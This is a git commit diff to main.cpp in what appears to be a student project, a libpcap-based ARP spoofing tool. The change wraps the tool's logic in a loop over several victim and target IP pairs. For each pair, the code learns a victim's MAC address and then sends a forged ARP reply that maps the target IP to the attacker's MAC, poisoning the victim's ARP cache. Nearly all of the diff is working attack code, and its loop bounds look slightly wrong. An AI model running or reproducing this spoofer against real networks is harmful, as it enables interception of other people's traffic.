f242f272f20d66224ed52b6a969d00a7fabba20d
myeong <myeong@myeongjin.myeongjin>
2024-03-30 21:56:05 +0900

    ..

--- main.cpp
+++ main.cpp
@@ -66,91 +66,91 @@ int main(int argc, char* argv[]) {
 	}
 
 	s_Mac_Add atkr_mac = getMacAddress(argv[1]);
-	char attacker_mac[18] = "";
-	sprintf(attacker_mac, "%02x:%02x:%02x:%02x:%02x:%02x", atkr_mac.addr[0], atkr_mac.addr[1], atkr_mac.addr[2], atkr_mac.addr[3], atkr_mac.addr[4], atkr_mac.addr[5]);
 
-	char errbuf[PCAP_ERRBUF_SIZE];
+	for (int i = 1; i < (argc - 2) / 2; i++) {
+		char attacker_mac[18] = "";
+		sprintf(attacker_mac, "%02x:%02x:%02x:%02x:%02x:%02x", atkr_mac.addr[0], atkr_mac.addr[1], atkr_mac.addr[2], atkr_mac.addr[3], atkr_mac.addr[4], atkr_mac.addr[5]);
 
-	pcap_t* handle = pcap_open_live(argv[1], BUFSIZE, 1, 1, errbuf);
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
-		return -1;
-	}
+		char errbuf[PCAP_ERRBUF_SIZE];
 
-	EthArpPacket packet;	
-
-	// Send ARP request packet
-	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
-	packet.eth_.smac_ = Mac(attacker_mac);
-	packet.eth_.type_ = htons(EthHdr::Arp);
-
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Request);
-	packet.arp_.smac_ = Mac(attacker_mac);
-	packet.arp_.sip_ = htonl(Ip("192.168.193.168"));
-	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Unknown MAC address
-	packet.arp_.tip_ = htonl(Ip(argv[2])); // Victim's IP address
-
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-		return -1;
-	}
-
-	// Capture ARP reply packet
-	while (true) {
-
-		printf("Waiting for ARP reply...\n");
-		struct pcap_pkthdr* header;
-		const u_char* packet_data;
-
-		int res = pcap_next_ex(handle, &header, &packet_data);
-		if (res == 0) continue; // Timeout expired
-		if (res == -1 || res == -2) {
-    		fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-    		break;
+		pcap_t* handle = pcap_open_live(argv[1], BUFSIZE, 1, 1, errbuf);
+		if (handle == nullptr) {
+			fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
+			return -1;
 		}
-		// printf("%x", packet_data);
 
-		printf("ARP reply captured\n");
+		EthArpPacket packet;	
 
-		EthArpPacket* victim_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet_data));
+		// Send ARP request packet
+		packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
+		packet.eth_.smac_ = Mac(attacker_mac);
+		packet.eth_.type_ = htons(EthHdr::Arp);
 
-		if (victim_packet->arp_.sip_ == packet.arp_.tip_ && victim_packet->eth_.type_ == htons(EthHdr::Arp) && victim_packet->arp_.op_ == htons(ArpHdr::Reply)) {
-			Mac victim_mac = victim_packet->arp_.smac_;
-			printf("Victim's MAC address: %s", std::string(victim_mac).c_str());
+		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+		packet.arp_.pro_ = htons(EthHdr::Ip4);
+		packet.arp_.hln_ = Mac::SIZE;
+		packet.arp_.pln_ = Ip::SIZE;
+		packet.arp_.op_ = htons(ArpHdr::Request);
+		packet.arp_.smac_ = Mac(attacker_mac);
+		packet.arp_.sip_ = htonl(Ip("192.168.193.168"));
+		packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Unknown MAC address
+		packet.arp_.tip_ = htonl(Ip(argv[2 * i])); // Victim's IP address
 
-			EthArpPacket packet2;
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			return -1;
+		}
 
-			packet2.eth_.dmac_ = Mac(victim_mac);
-			packet2.eth_.smac_ = Mac(attacker_mac);
-			packet2.eth_.type_ = htons(EthHdr::Arp);	
+		// Capture ARP reply packet
+		while (true) {
 
-			packet2.arp_.hrd_ = htons(ArpHdr::ETHER);
-			packet2.arp_.pro_ = htons(EthHdr::Ip4);
-			packet2.arp_.hln_ = Mac::SIZE;
-			packet2.arp_.pln_ = Ip::SIZE;
-			packet2.arp_.op_ = htons(ArpHdr::Reply);
-			packet2.arp_.smac_ = Mac(attacker_mac);
-			packet2.arp_.sip_ = htonl(Ip(argv[3]));
-			packet2.arp_.tmac_ = Mac(victim_mac); // Unknown MAC address
-			packet2.arp_.tip_ = htonl(Ip(argv[2])); // Victim's IP address
+			printf("Waiting for ARP reply...\n");
+			struct pcap_pkthdr* header;
+			const u_char* packet_data;
 
-			int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
-			if (res2 != 0) {
-				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
-				return -1;
+			int res = pcap_next_ex(handle, &header, &packet_data);
+			if (res == 0) continue; // Timeout expired
+			if (res == -1 || res == -2) {
+    			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+    			break;
 			}
 
-			break;
+			printf("ARP reply captured\n");
+
+			EthArpPacket* victim_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet_data));
+
+			if (victim_packet->arp_.sip_ == packet.arp_.tip_ && victim_packet->eth_.type_ == htons(EthHdr::Arp) && victim_packet->arp_.op_ == htons(ArpHdr::Reply)) {
+				Mac victim_mac = victim_packet->arp_.smac_;
+				printf("Victim's MAC address: %s", std::string(victim_mac).c_str());
+
+				EthArpPacket packet2;
+
+				packet2.eth_.dmac_ = Mac(victim_mac);
+				packet2.eth_.smac_ = Mac(attacker_mac);
+				packet2.eth_.type_ = htons(EthHdr::Arp);	
+
+				packet2.arp_.hrd_ = htons(ArpHdr::ETHER);
+				packet2.arp_.pro_ = htons(EthHdr::Ip4);
+				packet2.arp_.hln_ = Mac::SIZE;
+				packet2.arp_.pln_ = Ip::SIZE;
+				packet2.arp_.op_ = htons(ArpHdr::Reply);
+				packet2.arp_.smac_ = Mac(attacker_mac);
+				packet2.arp_.sip_ = htonl(Ip(argv[2 * i + 1]));
+				packet2.arp_.tmac_ = Mac(victim_mac); // Unknown MAC address
+				packet2.arp_.tip_ = htonl(Ip(argv[2 * i])); // Victim's IP address
+
+				int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
+				if (res2 != 0) {
+					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
+					return -1;
+				}
+
+				break;
+			}
+			printf("Not an ARP reply packet\n");
 		}
-		printf("Not an ARP reply packet\n");
+
+		pcap_close(handle);
 	}
-
-	
-
-	pcap_close(handle);
 }
